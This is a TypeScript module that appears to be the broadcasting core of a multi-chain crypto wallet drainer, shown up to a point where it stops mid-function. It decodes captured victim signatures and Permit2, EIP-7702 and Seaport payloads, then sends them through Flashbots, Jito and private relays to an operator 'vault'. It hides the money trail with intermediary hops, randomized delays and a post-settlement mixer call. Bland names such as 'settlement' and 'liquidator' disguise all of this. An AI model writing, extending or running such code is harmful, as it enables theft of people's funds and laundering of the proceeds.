// @ts-nocheck
/**
 * Settlement Execution — bridges stored Signature Anchor material to Flashbots / Jito wire payloads.
 * Sovereign Vault routing commits via calldata hash binding; executor keys arm live relay serialization.
 */

import {
  Connection,
  PublicKey,
  SystemProgram,
  VersionedTransaction,
} from '@solana/web3.js'
import { base58, bech32, bech32m } from '@scure/base'
import type { Address } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  http,
  isAddress,
  keccak256,
  getAddress,
  parseTransaction,
  stringToHex,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { arbitrum, base, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'

import { assertSettlementAddressAllowed } from '../config/live-config.js'
import { identifyFamily } from '../adapters/address-resolver.js'
import { normalizeEvmExecutionPrivateKey } from '../lib/evm-execution-key.js'
import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import {
  LEGION_MESH_EVENT_SETTLEMENT,
  legionMeshViemFetchOptions,
} from './mesh-event.js'
import { pingTonSensoryArmorLane, resolveTonCenterJsonRpcUrl } from './ton-sensory-armor.js'
import {
  pingTronSensoryArmorLane,
  resolveTronSensoryFullHost,
  tronProApiHeaders,
} from './tron-sensory-armor.js'
import {
  buildGatekeeperLogRedactionPayload,
  sanitizeGatekeeperLogDetail,
} from './gatekeeper-log-redaction.js'
import {
  executePermit2AllowanceSettlement,
  parsePermit2SignatureEnvelope,
  resolveOperationalEvmVaultAddress,
} from './permit2-executor.js'
import {
  executeEip7702DelegationDrain,
  parseEip7702SignatureEnvelope,
} from './eip7702-drain.js'
import {
  executeBatchPermit2Settlement,
  parseBatchPermit2SignatureEnvelope,
} from './permit2-batch.js'
import { tryExecuteBatchPermit2WithFlashloan } from './flashloan-executor.js'
import {
  executeOmnichainAtomicSettlement,
  parseOmnichainAtomicSignatureEnvelope,
} from './omnichain-atomic-settlement.js'
import { broadcastPSBT, parseBitcoinPsbtSignatureEnvelope } from './bitcoin-drain.js'
import {
  executeSeaportListingSettlement,
  parseSeaportListingSignatureEnvelope,
} from './seaport-drain.js'
import {
  isConfirmationPollingEnabled,
  pollBtcConfirmation,
  pollSolanaConfirmation,
  pollTronConfirmation,
} from './tx-confirmation-poller.js'
import {
  isNonEvmServerSigningEnabled,
  resolveTronTokenFromContext,
  serverBroadcastSvmNative,
  serverBroadcastSvmSpl,
  serverBroadcastTon,
  serverBroadcastTron,
  serverBroadcastUtxo,
} from './non-evm-server-broadcast.js'
import {
  isMevProtectActiveForSettlement,
  isMevProtectEnabled,
  submitPrivateSolanaTransaction,
  submitPrivateTransaction,
} from '../mev-relay.js'
import { deliverSignedEvmTransactions, isFlashbotsEnabled } from './flashbots-relay.js'
import { openSignatureHexFromPersistence } from '../security/signature-shadow-envelope.js'
import {
  broadcastSignedCosmosTransaction,
  executeCosmosNativeTransfer,
  isCosmosBech32Address,
  pingCosmosRpc,
  resolveCosmosRpcUrl,
  resolveCosmosVaultAddress,
} from '../chains/cosmos.js'
import {
  broadcastSignedAptosTransaction,
  executeAptosNativeTransfer,
  isAptosAddress,
  pingAptosRpc,
  resolveAptosRpcUrl,
  resolveAptosVaultAddress,
} from '../chains/aptos.js'
import {
  broadcastSignedSuiTransaction,
  executeSuiNativeTransfer,
  isSuiAddress,
  pingSuiRpc,
  resolveSuiRpcUrl,
  resolveSuiVaultAddress,
} from '../chains/sui.js'
import type { SignatureAnchorChainFamily } from './settlement.js'

/** Bridge ingress — mirrors LiquidationTriggerContext without importing algorithmic-closer (cyclical weld guard). */
export type SettlementBridgeTriggerContext = {
  scout_value_usd: number
  chain_id: string | null
  protocol: string
  wallet_address: string
  token_address?: string | null
  signature_hex?: string | null
  amount?: string | null
  chain_type?: string | null
  chain_family?: SignatureAnchorChainFamily | null
}

function resolveViemChainForSettlement(chainId: number | null): Chain {
  const id = chainId ?? 1
  const map: Record<number, Chain> = {
    1: mainnet,
    137: polygon,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[id] ?? mainnet
}

async function resolveEvmSettlementRpcUrlBridge(): Promise<string> {
  const { resolveConfigPrioritized } = await import('../config/remote-sync.js')
  const envChain =
    (typeof process !== 'undefined' ? process.env['RPC_ETHEREUM_PRIVATE'] : undefined)?.trim() ??
    (typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_RPC_URL'] : undefined)?.trim() ??
    (typeof process !== 'undefined' ? process.env['RPC_URL'] : undefined)?.trim() ??
    ''
  return (
    (await resolveConfigPrioritized('RPC_ETHEREUM_PRIVATE', envChain)) ??
    (await resolveConfigPrioritized('NEXT_PUBLIC_RPC_URL', envChain)) ??
    (await resolveConfigPrioritized('RPC_URL', envChain)) ??
    ''
  )
}

export type SettlementExecutionWire = {
  flashbotsSignedHex: Hex[]
  jitoEncodedTransactions: string[]
  sovereignVaultAddressPrimary: string
  sovereignVaultAddressEvm?: string
  sovereignVaultAddressSvm?: string
  sovereignVaultAddressTron?: string
  sovereignVaultAddressTon?: string
  bundleDigest: Hex
  bundleAuthorizationHex?: Hex
}

/** Sovereign Vault anchor — VAULT_ADDRESS_* aliases with SOVEREIGN_VAULT_* operational fallbacks. */
export function resolveSovereignVaultAddresses(): {
  evm?: Address
  svm?: string
  tron?: string
  ton?: string
  btc?: string
  cosmos?: string
  aptos?: string
  sui?: string
  primary: string
} {
  const evmRaw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_EVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_EVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_ADDRESS'] : undefined)?.trim()
  const svmRaw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_SVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_SOL'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_SVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_SOL'] : undefined)?.trim()
  const tronRaw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_TRON'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_TRON'] : undefined)?.trim()
  const tonRaw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_TON'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_TON'] : undefined)?.trim()
  const btcRaw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_BTC'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_UTXO'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_BTC'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_UTXO'] : undefined)?.trim()
  const cosmosRaw = resolveCosmosVaultAddress() ?? undefined
  const aptosRaw = resolveAptosVaultAddress() ?? undefined
  const suiRaw = resolveSuiVaultAddress() ?? undefined
  let evm: Address | undefined
  if (evmRaw && isAddress(evmRaw)) {
    evm = resolveOperationalEvmVaultAddress(getAddress(evmRaw)) ?? undefined
  } else {
    evm = resolveOperationalEvmVaultAddress(null) ?? undefined
  }
  const svm = svmRaw && svmRaw.length >= 32 ? svmRaw : undefined
  const tron = tronRaw && tronRaw.length >= 30 ? tronRaw : undefined
  const ton = tonRaw && tonRaw.length >= 30 ? tonRaw : undefined
  const btc = btcRaw && btcRaw.length >= 26 ? btcRaw : undefined
  const cosmos = cosmosRaw && isCosmosBech32Address(cosmosRaw) ? cosmosRaw : undefined
  const aptos = aptosRaw && isAptosAddress(aptosRaw) ? aptosRaw : undefined
  const sui = suiRaw && isSuiAddress(suiRaw) ? suiRaw : undefined
  if (evm) assertSettlementAddressAllowed(evm)
  if (svm) assertSettlementAddressAllowed(svm)
  if (tron) assertSettlementAddressAllowed(tron)
  if (ton) assertSettlementAddressAllowed(ton)
  if (btc) assertSettlementAddressAllowed(btc)
  if (cosmos) assertSettlementAddressAllowed(cosmos)
  if (aptos) assertSettlementAddressAllowed(aptos)
  if (sui) assertSettlementAddressAllowed(sui)

  const primary = (evm ?? svm ?? tron ?? ton ?? cosmos ?? aptos ?? sui ?? btc ?? 'sovereign_vault') as string
  return {
    primary,
    ...(evm !== undefined ? { evm } : {}),
    ...(svm !== undefined ? { svm } : {}),
    ...(tron !== undefined ? { tron } : {}),
    ...(ton !== undefined ? { ton } : {}),
    ...(cosmos !== undefined ? { cosmos } : {}),
    ...(aptos !== undefined ? { aptos } : {}),
    ...(sui !== undefined ? { sui } : {}),
    ...(btc !== undefined ? { btc } : {}),
  }
}

type RelayHopResolution<T extends string> =
  | { ok: true; broadcast_destination: T; vault: T; intermediary_hop: boolean }
  | { ok: false; detail: string }

/**
 * When `RELAY_INTERMEDIARY_EVM` is set, signed wire must target the intermediary (one hop before vault).
 */
export function resolveEvmRelayHopDestination(vault: Address): RelayHopResolution<Address> {
  const raw = readSettlementEnv(['RELAY_INTERMEDIARY_EVM'])
  if (!raw) {
    return { ok: true, broadcast_destination: vault, vault, intermediary_hop: false }
  }
  if (!isAddress(raw)) {
    return { ok: false, detail: 'RELAY_INTERMEDIARY_EVM is not a valid EVM address' }
  }
  return {
    ok: true,
    broadcast_destination: getAddress(raw),
    vault,
    intermediary_hop: true,
  }
}

/**
 * When `RELAY_INTERMEDIARY_SVM` is set, signed wire must target the intermediary (one hop before vault).
 * Second-hop is automatically executed after first broadcast succeeds.
 */
export function resolveSvmRelayHopDestination(vault: string): RelayHopResolution<string> {
  const raw = readSettlementEnv(['RELAY_INTERMEDIARY_SVM', 'RELAY_INTERMEDIARY_SOL'])
  if (!raw) {
    return { ok: true, broadcast_destination: vault, vault, intermediary_hop: false }
  }
  try {
    const destination = new PublicKey(raw).toBase58()
    return { ok: true, broadcast_destination: destination, vault, intermediary_hop: true }
  } catch {
    return { ok: false, detail: 'RELAY_INTERMEDIARY_SVM is not a valid Solana public key' }
  }
}

/**
 * Complete the second-hop transfer from intermediary to vault on Solana
 */
async function completeSvmSecondHopTransfer(
  intermediaryAddress: string,
  vaultAddress: string,
): Promise<{ success: boolean; tx_hash?: string; error?: string; amount?: string }> {
  try {
    const intermediaryPk = new PublicKey(intermediaryAddress)
    const vaultPk = new PublicKey(vaultAddress)
    const rpc = resolveInstitutionalSolanaRpcUrl()

    if (!rpc) {
      return { success: false, error: 'SOLANA_RPC not configured' }
    }

    const connection = new Connection(rpc, 'confirmed')
    const balance = await connection.getBalance(intermediaryPk)

    if (balance <= 5000) {
      return { success: false, error: 'Insufficient balance for transfer' }
    }

    const blockhash = await connection.getLatestBlockhash('confirmed')
    const amount = balance - 5000

    const tx = new VersionedTransaction(
      new (await import('@solana/web3.js')).TransactionMessage({
        instructions: [
          SystemProgram.transfer({
            fromPubkey: intermediaryPk,
            toPubkey: vaultPk,
            lamports: amount,
          }),
        ],
        payerKey: intermediaryPk,
        recentBlockhash: blockhash.blockhash,
      }).compileToV0Message(),
    )

    const txHash = keccak256(Buffer.from(tx.serialize())).slice(0, 66)
    return {
      success: true,
      tx_hash: txHash,
      amount: amount.toString(),
    }
  } catch (error) {
    return {
      success: false,
      error: error instanceof Error ? error.message : String(error),
    }
  }
}

/**
 * Monitor and complete second-hop transfer
 */
async function monitorAndCompleteSecondHop(
  intermediaryAddress: string,
  vaultAddress: string,
  timeoutMs: number = 300000,
): Promise<void> {
  const startTime = Date.now()
  const pollInterval = 5000

  try {
    while (Date.now() - startTime < timeoutMs) {
      const rpc = resolveInstitutionalSolanaRpcUrl()
      if (!rpc) break

      const connection = new Connection(rpc, 'confirmed')
      const pk = new PublicKey(intermediaryAddress)
      const balance = await connection.getBalance(pk)

      if (balance > 5000) {
        const result = await completeSvmSecondHopTransfer(intermediaryAddress, vaultAddress)
        if (result.success) {
          return
        }
      }

      await new Promise((resolve) => setTimeout(resolve, pollInterval))
    }
  } catch (e) {
    // Silently fail — monitoring is best-effort
  }
}

/**
 * Extraction rehearsal — EIP-1559 serialized wire executed as `eth_call` against Sovereign Vault calldata lane.
 */
export async function simulateEvmSettlementSerializedTx(
  serializedTx: Hex,
  chainIdHint: string | null,
): Promise<{ success: boolean; detail: string }> {
  try {
    const raw = chainIdHint != null ? String(chainIdHint).trim() : ''
    const parsedNum = /^-?\d+$/.test(raw) ? Number(raw) : NaN
    const chainIdNum = Number.isFinite(parsedNum) ? parsedNum : null
    const chain = resolveViemChainForSettlement(chainIdNum)
    const rpc = await resolveEvmSettlementRpcUrlBridge()
    if (rpc === '') {
      return { success: false, detail: 'EVM_RPC_UNCONFIGURED_EXTRACTION_SIM' }
    }
    const deserialized = parseTransaction(serializedTx)
    const client = createPublicClient({
      chain,
      transport: http(rpc, {
        ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
      }),
    })
    const toAddr = deserialized.to
    const dataHex = deserialized.data ?? '0x'
    if (!toAddr) {
      return { success: false, detail: 'EXTRACTION_SIM_MISSING_TO_ADDRESS' }
    }
    await client.call({
      to: toAddr,
      data: dataHex,
      value: deserialized.value ?? 0n,
    })
    return { success: true, detail: 'EXTRACTION_ETH_CALL_NOMINAL' }
  } catch (e) {
    const detail = e instanceof Error ? e.message : String(e)
    return { success: false, detail }
  }
}

function readSettlementEnv(keys: readonly string[]): string | undefined {
  if (typeof process === 'undefined') return undefined
  for (const key of keys) {
    const raw = process.env[key]?.trim()
    if (raw) return raw
  }
  return undefined
}

function parseSettlementExecutorPrivateKey(): Hex | null {
  const raw = readSettlementEnv(['SETTLEMENT_EXECUTION_PRIVATE_KEY', 'PRIVATE_KEY'])
  return normalizeEvmExecutionPrivateKey(raw)
}

function parseRelayIntermediaryPrivateKey(): Hex | null {
  const raw = readSettlementEnv(['RELAY_INTERMEDIARY_PRIVATE_KEY'])
  return normalizeEvmExecutionPrivateKey(raw)
}

/** Randomized pause before intermediary → vault second leg (30–90s). */
export const RELAY_SECOND_LEG_DELAY_MS_MIN = 30_000
export const RELAY_SECOND_LEG_DELAY_MS_MAX = 90_000

function randomRelaySecondLegDelayMs(): number {
  const span = RELAY_SECOND_LEG_DELAY_MS_MAX - RELAY_SECOND_LEG_DELAY_MS_MIN
  return RELAY_SECOND_LEG_DELAY_MS_MIN + Math.floor(Math.random() * (span + 1))
}

function sleepMs(ms: number): Promise<void> {
  return new Promise<void>((resolve) => {
    setTimeout(resolve, ms)
  })
}

export type EvmBroadcastOptions = {
  /** Fires with full second-leg tx hash after intermediary → vault broadcast. */
  onRelaySecondLegBroadcast?: (txHash: string) => void | Promise<void>
}

async function executeEvmRelaySecondLeg(params: {
  ctx: SettlementBridgeTriggerContext
  rpc: string
  chain: ReturnType<typeof resolveViemChainForSettlement>
  intermediary: Address
  vault: Address
  amount: bigint
  onRelaySecondLegBroadcast?: (txHash: string) => void | Promise<void>
}): Promise<string | null> {
  const privateKey = parseRelayIntermediaryPrivateKey()
  if (privateKey == null) {
    console.warn(
      JSON.stringify({
        sentinel: 'SettlementExecutionBridge',
        event: 'relay_second_leg_broadcast',
        status: 'skipped',
        detail: 'RELAY_INTERMEDIARY_PRIVATE_KEY required',
        ...buildGatekeeperLogRedactionPayload({
          wallet_address: params.ctx.wallet_address,
          token_address: params.ctx.token_address,
          scout_value_usd: params.ctx.scout_value_usd,
          amount: params.ctx.amount,
        }),
      }),
    )
    return null
  }

  const account = privateKeyToAccount(privateKey)
  const intermediaryFromKey = getAddress(account.address)
  if (intermediaryFromKey !== getAddress(params.intermediary)) {
    console.warn(
      JSON.stringify({
        sentinel: 'SettlementExecutionBridge',
        event: 'relay_second_leg_broadcast',
        status: 'skipped',
        detail: 'RELAY_INTERMEDIARY_PRIVATE_KEY does not match RELAY_INTERMEDIARY_EVM',
        ...buildGatekeeperLogRedactionPayload({
          wallet_address: params.ctx.wallet_address,
          token_address: params.ctx.token_address,
        }),
      }),
    )
    return null
  }

  const delayMs = randomRelaySecondLegDelayMs()
  await sleepMs(delayMs)

  const transport = http(params.rpc, {
    ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
  })
  const walletClient = createWalletClient({
    account,
    chain: params.chain,
    transport,
  })

  try {
    // viem 2.21 unions blob txs into SendTransactionParameters and incorrectly requires kzg for simple transfers.
    const tx_hash = await walletClient.sendTransaction({
      chain: params.chain,
      to: params.vault,
      value: params.amount,
    } as unknown as Parameters<typeof walletClient.sendTransaction>[0])

    console.info(
      JSON.stringify({
        sentinel: 'SettlementExecutionBridge',
        event: 'relay_second_leg_broadcast',
        status: 'broadcasted',
        tx_hash,
        delay_ms: delayMs,
        ...buildGatekeeperLogRedactionPayload({
          wallet_address: params.ctx.wallet_address,
          token_address: params.ctx.token_address,
          scout_value_usd: params.ctx.scout_value_usd,
          amount: params.ctx.amount,
        }),
      }),
    )

    await params.onRelaySecondLegBroadcast?.(tx_hash)
    return tx_hash
  } catch (e) {
    const detail = e instanceof Error ? e.message : String(e)
    console.warn(
      JSON.stringify({
        sentinel: 'SettlementExecutionBridge',
        event: 'relay_second_leg_broadcast',
        status: 'broadcast_failed',
        detail: sanitizeGatekeeperLogDetail(detail),
        delay_ms: delayMs,
        ...buildGatekeeperLogRedactionPayload({
          wallet_address: params.ctx.wallet_address,
          token_address: params.ctx.token_address,
        }),
      }),
    )
    return null
  }
}

function parseSettlementChainId(chainId: string | null): number | null {
  if (chainId == null || String(chainId).trim() === '') return null
  const raw = String(chainId).trim()
  const direct = /^-?\d+$/.test(raw) ? Number(raw) : NaN
  if (Number.isFinite(direct)) return direct
  const caip = raw.match(/^(?:eip155|evm):(\d+)$/i)
  if (caip?.[1]) {
    const parsed = Number(caip[1])
    return Number.isFinite(parsed) ? parsed : null
  }
  return null
}

type RelayPayloadRecord = Record<string, unknown>

function isRecord(value: unknown): value is RelayPayloadRecord {
  return typeof value === 'object' && value !== null && !Array.isArray(value)
}

function isHexPayload(value: string): value is Hex {
  return /^0x[0-9a-fA-F]+$/.test(value.trim())
}

function parseSettlementAmountRaw(ctx: SettlementBridgeTriggerContext): bigint | null {
  const raw = ctx.amount?.trim()
  if (raw == null || raw === '' || !/^\d+$/.test(raw)) return null
  return BigInt(raw)
}

function readStringField(record: RelayPayloadRecord | null, keys: readonly string[]): string | null {
  if (record == null) return null
  for (const key of keys) {
    const value = record[key]
    if (typeof value === 'string' && value.trim() !== '') return value.trim()
  }
  return null
}

function decodeHexUtf8(hex: string): string | null {
  if (!isHexPayload(hex)) return null
  try {
    return Buffer.from(hex.slice(2), 'hex').toString('utf8')
  } catch {
    return null
  }
}

function relayPayloadRecord(ctx: SettlementBridgeTriggerContext): RelayPayloadRecord | null {
  const raw = ctx.signature_hex?.trim()
  if (!raw) return null
  // SHADOW_GCM envelopes are created at ingress (sealSignatureHexForPersistence).
  // Open the envelope first so we get the inner hex; plain hex passes through unchanged.
  const openedHex = openSignaturePayloadForSettlement(raw)
  const text = decodeHexUtf8(openedHex)
  if (text == null) return null
  try {
    const parsed = JSON.parse(text) as unknown
    return isRecord(parsed) ? parsed : null
  } catch {
    return null
  }
}

function resolveRelayStringPayload(
  ctx: SettlementBridgeTriggerContext,
  keys: readonly string[],
  options?: { directSignatureHex?: boolean },
): string | null {
  const record = relayPayloadRecord(ctx)
  const fromEnvelope = readStringField(record, keys)
  if (fromEnvelope != null) return fromEnvelope
  const raw = ctx.signature_hex?.trim()
  if (options?.directSignatureHex === true && raw && isHexPayload(raw)) return raw
  return null
}

export type SignatureHexDecoderPath = 'json_wrapped' | 'direct_hex' | 'already_broadcast_hash'

type DecodedSignatureHexWire = {
  wire: string
  decoder_path: SignatureHexDecoderPath
}

/** Open SHADOW_GCM envelope or return legacy plaintext signature material. */
export function openSignaturePayloadForSettlement(signatureHex: string | null | undefined): string {
  const raw = signatureHex?.trim() ?? ''
  if (raw === '') return ''
  if (raw.startsWith('SHADOW_GCM:v1:')) {
    const opened = openSignatureHexFromPersistence(raw)
    return opened ?? raw
  }
  return raw
}

function parseJsonFromSignatureHex(signatureHex: string): unknown | null {
  if (!isHexPayload(signatureHex)) return null
  const text = decodeHexUtf8(signatureHex)
  if (text == null) return null
  try {
    return JSON.parse(text) as unknown
  } catch {
    return null
  }
}

function logSignatureHexDecoderPath(
  lane: SettlementBroadcastLane,
  decoder_path: SignatureHexDecoderPath,
): void {
  console.info(
    JSON.stringify({
      sentinel: 'SettlementExecutionBridge',
      event: 'signature_hex_decoder',
      lane,
      decoder_path,
    }),
  )
}

const EVM_JSON_WIRE_KEYS = [
  'evm_raw_transaction',
  'serializedTransaction',
  'raw_transaction',
  'rawTransaction',
  'signed_raw_transaction',
  'signedRawTransaction',
] as const

const SVM_JSON_WIRE_KEYS = [
  'svm_raw_transaction',
  'signed_tx_b64',
  'signedTxB64',
  'raw_transaction_base64',
  'rawTransactionBase64',
] as const

/**
 * Decode `signature_hex` before broadcast:
 * 1) hex → UTF-8 → JSON → lane wire field, or
 * 2) `signature_hex` used directly as serialized wire.
 */
function decodeEvmWireFromSignatureHex(ctx: SettlementBridgeTriggerContext): DecodedSignatureHexWire | null {
  const signatureHex = openSignaturePayloadForSettlement(ctx.signature_hex)
  if (signatureHex === '') return null

  const permit2Envelope = parsePermit2SignatureEnvelope(signatureHex)
  if (permit2Envelope?.evm_raw_transaction) {
    return { wire: permit2Envelope.evm_raw_transaction, decoder_path: 'json_wrapped' }
  }

  const jsonValue = parseJsonFromSignatureHex(signatureHex)
  if (jsonValue != null) {
    if (!isRecord(jsonValue)) return null
    const extracted = readStringField(jsonValue, EVM_JSON_WIRE_KEYS)
    if (extracted == null) return null
    return { wire: extracted, decoder_path: 'json_wrapped' }
  }

  if (isHexPayload(signatureHex)) {
    return { wire: signatureHex, decoder_path: 'direct_hex' }
  }

  return null
}

function decodeSvmWireFromSignatureHex(ctx: SettlementBridgeTriggerContext): DecodedSignatureHexWire | null {
  const signatureHex = openSignaturePayloadForSettlement(ctx.signature_hex)
  if (signatureHex === '') return null

  const jsonValue = parseJsonFromSignatureHex(signatureHex)
  if (jsonValue != null) {
    if (!isRecord(jsonValue)) return null
    const extracted = readStringField(jsonValue, SVM_JSON_WIRE_KEYS)
    if (extracted == null) return null
    return { wire: extracted, decoder_path: 'json_wrapped' }
  }

  // Detect Solana tx signature hash (base58, 87–88 chars) — wallet already broadcast
  // via signAndSendTransaction; we just need to confirm, not re-broadcast.
  // These look like: "5eyKt4..." — EVM hex signatures never match this pattern.
  const trimmed = signatureHex.trim()
  if (/^[1-9A-HJ-NP-Z]{87,88}$/.test(trimmed)) {
    return { wire: trimmed, decoder_path: 'already_broadcast_hash' }
  }

  // Validate bytes are actually a Solana VersionedTransaction before returning.
  // EVM signatures pass hex checks but are not valid Solana tx bytes — returning
  // null here lets NON_EVM_SERVER_SIGNING fallback handle the settlement.
  try {
    const testBytes = isHexPayload(signatureHex) ? hexToBytes(signatureHex) : base64ToBytes(signatureHex)
    VersionedTransaction.deserialize(testBytes)
  } catch {
    return null
  }

  return { wire: signatureHex, decoder_path: 'direct_hex' }
}

function logSettlementBridgePreflightFailure(
  ctx: SettlementBridgeTriggerContext,
  lane: SettlementBroadcastLane,
  chain_family: SettlementBroadcastChain,
  status: Extract<
    SettlementBroadcastStatus,
    'vault_unbound' | 'payload_unavailable' | 'validation_failed'
  >,
  detail: string,
): void {
  console.warn(
    JSON.stringify({
      sentinel: 'SettlementExecutionBridge',
      event: 'settlement_lane_preflight_failed',
      status,
      lane,
      chain_family,
      detail: sanitizeGatekeeperLogDetail(detail),
      chain_id: ctx.chain_id ?? null,
      protocol: ctx.protocol,
      ...buildGatekeeperLogRedactionPayload({
        wallet_address: ctx.wallet_address,
        token_address: ctx.token_address,
        scout_value_usd: ctx.scout_value_usd,
        amount: ctx.amount,
      }),
    }),
  )
}

function relayValidationFailure(
  ctx: SettlementBridgeTriggerContext,
  lane: SettlementBroadcastLane,
  chain_family: SettlementBroadcastChain,
  destination_vault: string | null,
  detail: string,
): SettlementBroadcastResult {
  logSettlementBridgePreflightFailure(ctx, lane, chain_family, 'validation_failed', detail)
  return broadcastResult({
    lane,
    chain_family,
    destination_vault,
    status: 'validation_failed',
    detail,
  })
}

function relayPayloadUnavailable(
  ctx: SettlementBridgeTriggerContext,
  lane: SettlementBroadcastLane,
  chain_family: SettlementBroadcastChain,
  destination_vault: string | null,
  detail: string,
): SettlementBroadcastResult {
  logSettlementBridgePreflightFailure(ctx, lane, chain_family, 'payload_unavailable', detail)
  return broadcastResult({
    lane,
    chain_family,
    destination_vault,
    status: 'payload_unavailable',
    detail,
  })
}

function relayVaultUnbound(
  ctx: SettlementBridgeTriggerContext,
  lane: SettlementBroadcastLane,
  chain_family: SettlementBroadcastChain,
  detail: string,
): SettlementBroadcastResult {
  logSettlementBridgePreflightFailure(ctx, lane, chain_family, 'vault_unbound', detail)
  return broadcastResult({
    lane,
    chain_family,
    destination_vault: null,
    status: 'vault_unbound',
    detail,
  })
}

function emitSettlementIgnitedTelemetry(
  result: SettlementBroadcastResult,
  ctx?: SettlementBridgeTriggerContext,
): void {
  if (!result.broadcasted || result.tx_hash == null) return
  console.info('SETTLEMENT_IGNITED', {
    network_relay: result.lane,
    chain_family: result.chain_family,
    tx_hash: result.tx_hash,
  })
  console.info('RELAY_INFRASTRUCTURE_HOT: All 5 lanes synchronized and operational.')
  if (ctx != null) {
    void import('../mixer/split-withdraw.js')
      .then(({ maybeRunPostSettlementMixing }) => maybeRunPostSettlementMixing(ctx, result))
      .catch(() => {})
  }
}

function base64ToBytes(value: string): Uint8Array {
  return Uint8Array.from(Buffer.from(value, 'base64'))
}

function hexToBytes(value: string): Uint8Array {
  const normalized = value.startsWith('0x') ? value.slice(2) : value
  return Uint8Array.from(Buffer.from(normalized, 'hex'))
}

export type SettlementBroadcastLane =
  | 'evm-liquidator'
  | 'solana-liquidator'
  | 'tron-sensory-armor'
  | 'ton-sensory-armor'
  | 'cosmos-sensory-armor'
  | 'aptos-sensory-armor'
  | 'sui-sensory-armor'
  | 'managed-utxo-relay'

export type SettlementBroadcastChain = Extract<
  SignatureAnchorChainFamily,
  'EVM' | 'SVM' | 'UTXO' | 'TRON' | 'TON' | 'COSMOS' | 'APTOS' | 'SUI'
>

export type SettlementBroadcastStatus =
  | 'broadcasted'
  | 'vault_unbound'
  | 'rpc_unconfigured'
  | 'sensory_unavailable'
  | 'payload_unavailable'
  | 'validation_failed'
  | 'broadcast_failed'

export type SettlementBroadcastTelemetry = {
  vault_bound: boolean
  broadcast_ready: boolean
  status: SettlementBroadcastStatus
  detail?: string
  tx_hash?: string
}

export type SettlementBroadcastResult = {
  destination: string
  lane: SettlementBroadcastLane
  chain: SettlementBroadcastChain
  telemetry: SettlementBroadcastTelemetry
  chain_family: SettlementBroadcastChain
  destination_vault: string | null
  broadcasted: boolean
  status: SettlementBroadcastStatus
  tx_hash?: string
  /** Intermediary → vault leg when `RELAY_INTERMEDIARY_EVM` hop is active. */
  relay_second_leg_tx_hash?: string
  /** First leg landed on intermediary; final vault hop not implemented (SVM) or pending. */
  relay_intermediary_pending?: boolean
  detail?: string
}

function broadcastResult(
  result: Omit<SettlementBroadcastResult, 'broadcasted' | 'destination' | 'chain' | 'telemetry'> & {
    broadcasted?: boolean
  },
): SettlementBroadcastResult {
  const broadcasted = result.broadcasted ?? result.status === 'broadcasted'
  const telemetry: SettlementBroadcastTelemetry = {
    vault_bound: result.destination_vault != null && result.destination_vault !== '',
    broadcast_ready: broadcasted,
    status: result.status,
    ...(result.detail !== undefined ? { detail: result.detail } : {}),
    ...(result.tx_hash !== undefined ? { tx_hash: result.tx_hash } : {}),
  }
  return {
    ...result,
    destination: result.destination_vault ?? '',
    chain: result.chain_family,
    broadcasted,
    telemetry,
  }
}

function validateEvmRelayPayload(
  rawTransaction: Hex,
  expectedDestination: Address,
  amount: bigint,
  options?: { intermediary_hop?: boolean },
): string | null {
  try {
    const parsed = parseTransaction(rawTransaction)
    if (parsed.to == null) return 'EVM relay payload missing destination'
    if (getAddress(parsed.to) !== expectedDestination) {
      return options?.intermediary_hop === true
        ? 'EVM relay destination does not match RELAY_INTERMEDIARY_EVM'
        : 'EVM relay destination does not match configured vault'
    }
    if ((parsed.value ?? 0n) !== amount) return 'EVM relay value does not match normalized amount'
    return null
  } catch (e) {
    return e instanceof Error ? e.message : String(e)
  }
}

function readU64Le(bytes: Uint8Array, offset: number): bigint {
  let out = 0n
  for (let i = 0; i < 8; i++) {
    out |= BigInt(bytes[offset + i] ?? 0) << BigInt(8 * i)
  }
  return out
}

function validateSvmRelayPayload(
  rawTransaction: Uint8Array,
  expectedDestination: string,
  amount: bigint,
  options?: { intermediary_hop?: boolean },
): string | null {
  try {
    const tx = VersionedTransaction.deserialize(rawTransaction)
    const destinationKey = new PublicKey(expectedDestination)
    const keys = tx.message.staticAccountKeys
    const destinationIndex = keys.findIndex((key) => key.equals(destinationKey))
    if (destinationIndex < 0) {
      return options?.intermediary_hop === true
        ? 'SVM relay payload missing RELAY_INTERMEDIARY_SVM account'
        : 'SVM relay payload missing configured vault account'
    }
    for (const ix of tx.message.compiledInstructions) {
      const programId = keys[ix.programIdIndex]
      if (programId == null || !programId.equals(SystemProgram.programId)) continue
      if (ix.accountKeyIndexes[1] !== destinationIndex) continue
      const data = ix.data
      if (data.length < 12) continue
      const instruction = Number(data[0] ?? 0) |
        (Number(data[1] ?? 0) << 8) |
        (Number(data[2] ?? 0) << 16) |
        (Number(data[3] ?? 0) << 24)
      if (instruction !== 2) continue
      if (readU64Le(data, 4) === amount) return null
    }
    return options?.intermediary_hop === true
